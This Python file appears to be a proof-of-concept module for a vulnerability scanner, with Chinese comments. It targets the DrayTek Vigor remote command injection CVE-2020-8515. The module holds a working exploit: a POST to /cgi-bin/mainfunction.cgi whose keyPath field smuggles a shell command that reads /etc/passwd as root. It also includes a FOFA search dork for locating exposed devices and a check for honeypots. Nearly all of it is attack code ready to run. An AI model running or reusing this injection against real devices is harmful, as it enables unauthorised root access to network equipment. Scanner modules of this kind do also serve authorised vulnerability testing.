# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "DrayTek企业网络设备 远程命令执行(CVE-2020-8515)",                        # 漏洞名称
        "VulnID" : "CVE-2020-8515",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "DrayTek企业网络设备",                     # 漏洞应用名称
        "AppVersion" : """
            Vigor2960 < v1.5.1
            Vigor300B < v1.5.1
            Vigor3900 < v1.5.1
            VigorSwitch20P2121 <= v2.3.2
            VigorSwitch20G1280 <= v2.3.2
            VigorSwitch20P1280 <= v2.3.2
            VigorSwitch20G2280 <= v2.3.2
            VigorSwitch20P2280 <= v2.3.2
        """,                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            DrayTek URI未能正确处理SHELL字符，
            远程攻击者可以利用该漏洞提交特殊的请求，可以ROOT权限执行任意命令。

            远程命令注入漏洞被标记为CVE-2020-8515，
            主要影响了DrayTek Vigor网络设备，包括企业交换机、路由器、负载均衡器和VPN网关。
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            title="Vigor 2960"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url = self.target + "/cgi-bin/mainfunction.cgi" # url自己按需调整
        data = "action=login&keyPath=%27%0A%2fbin%2fcat${IFS}/etc/passwd%0A%27&loginUser=a&loginPwd=a"

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    # "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.post(url,data = data,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if "root:!:0:0:root:/tmp:/bin/ash" in req.text and req.status_code == 200:
                vuln = [True,req.text]
            else:
                vuln = [False,req.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()